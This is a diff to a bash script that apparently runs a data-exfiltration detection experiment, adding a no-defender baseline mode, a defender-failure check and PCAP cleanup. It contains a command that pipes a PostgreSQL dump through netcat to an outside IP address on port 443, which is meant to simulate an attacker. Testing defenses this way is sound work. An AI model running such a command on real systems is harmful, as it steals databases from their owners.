@@ -121,23 +121,34 @@ if [ $elapsed -ge $max_wait ]; then
     exit 1
 fi
 
-# Phase 2: Start defender
-log "=== Phase 2: Starting Defender ==="
+# Phase 2: Start defender (skip if SKIP_DEFENDER is set)
+if [[ "$SKIP_DEFENDER" == "true" ]]; then
+    log "=== Phase 2: SKIPPING Defender (baseline mode) ==="
 
-# Set RUN_ID to match our experiment ID so all outputs go to the same directory
-log "Setting RUN_ID to match experiment ID: $EXPERIMENT_ID"
-echo "$EXPERIMENT_ID" > "$RUN_ID_FILE"
+    # Set RUN_ID to match our experiment ID so all outputs go to the same directory
+    log "Setting RUN_ID to match experiment ID: $EXPERIMENT_ID"
+    echo "$EXPERIMENT_ID" > "$RUN_ID_FILE"
 
-log "Running 'make defend'..."
-make defend
+    log "Defender disabled - running in baseline mode (no automated response)"
+    log_success "Baseline mode configured!"
+else
+    log "=== Phase 2: Starting Defender ==="
 
-# Wait for defender to be ready
-log "Waiting for defender to be ready..."
-if ! make verify; then
-    log_error "Defender failed health checks"
-    exit 1
+    # Set RUN_ID to match our experiment ID so all outputs go to the same directory
+    log "Setting RUN_ID to match experiment ID: $EXPERIMENT_ID"
+    echo "$EXPERIMENT_ID" > "$RUN_ID_FILE"
+
+    log "Running 'make defend'..."
+    make defend
+
+    # Wait for defender to be ready
+    log "Waiting for defender to be ready..."
+    if ! make verify; then
+        log_error "Defender failed health checks"
+        exit 1
+    fi
+    log_success "Defender is ready!"
 fi
-log_success "Defender is ready!"
 
 # Phase 3: Start exfiltration monitoring
 log "=== Phase 3: Starting Exfiltration Monitoring ==="
@@ -160,7 +171,7 @@ log "Exfiltration start time: $(date -Iseconds)"
 # Execute exfiltration command in background
 # This simulates an attacker exfiltrating the database
 log "Executing: pg_dump | nc to exfil server..."
-docker exec lab_server su - postgres -c 'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 443' > "$EXPERIMENT_OUTPUTS/logs/exfil_command.log" 2>&1 &
+docker exec lab_server su - postgres -c 'pg_dump -U postgres labdb | nc -w 600 137.184.126.86 443' > "$EXPERIMENT_OUTPUTS/logs/exfil_command.log" 2>&1 &
 EXFIL_PID=$!
 
 log "Exfiltration command started (PID: $EXFIL_PID)"
@@ -400,6 +411,16 @@ final_exfil_size_human="0 bytes"
 if [[ -f "$exfil_file" ]]; then
     final_exfil_size=$(stat -c%s "$exfil_file" 2>/dev/null || echo "0")
     final_exfil_size_human=$(numfmt --to=si $final_exfil_size 2>/dev/null || echo "${final_exfil_size} bytes")
+
+    # Check if defender failed (exfiltrated >= 2.8GB which is the baseline)
+    # Baseline is 2.8GB (2,920,249,784 bytes from our no-defender tests)
+    if [[ $final_exfil_size -ge 2800000000 ]]; then
+        log_warning "⚠️ DEFENDER FAILURE: Exfiltrated ${final_exfil_size_human} >= 2.8GB baseline!"
+        log_warning "⚠️ This indicates the defender did NOT block the exfiltration"
+        defender_failed="true"
+    else
+        defender_failed="false"
+    fi
 fi
 
 # Get high confidence alert details
@@ -475,6 +496,7 @@ cat > "$EXPERIMENT_OUTPUTS/exfil_experiment_summary.json" << EOF
         "last_byte_time": "${last_byte_time:-null}",
         "exfil_file_size_bytes": $final_exfil_size,
         "exfil_file_size_human": "$final_exfil_size_human",
+        "defender_failed": ${defender_failed:-false},
         "blocking_analysis": {
             "blocked_mid_transfer": $blocked_mid_transfer,
             "block_time_seconds": ${block_time_seconds:-null},
@@ -522,5 +544,12 @@ log "Results saved in: $EXPERIMENT_OUTPUTS"
 log "Summary saved in: $EXPERIMENT_OUTPUTS/exfil_experiment_summary.json"
 
 log_success "Experiment complete!"
+
+# Delete PCAPs to save disk space (they're large and not needed for analysis)
+log "Deleting PCAPs to save disk space..."
+rm -rf "$EXPERIMENT_OUTPUTS/pcaps" 2>/dev/null || true
+# Also delete PCAPs from the original outputs directory
+rm -rf "/home/diego/Trident/outputs/$EXPERIMENT_ID/pcaps" 2>/dev/null || true
+log "PCAPs deleted"
 
 exit 0
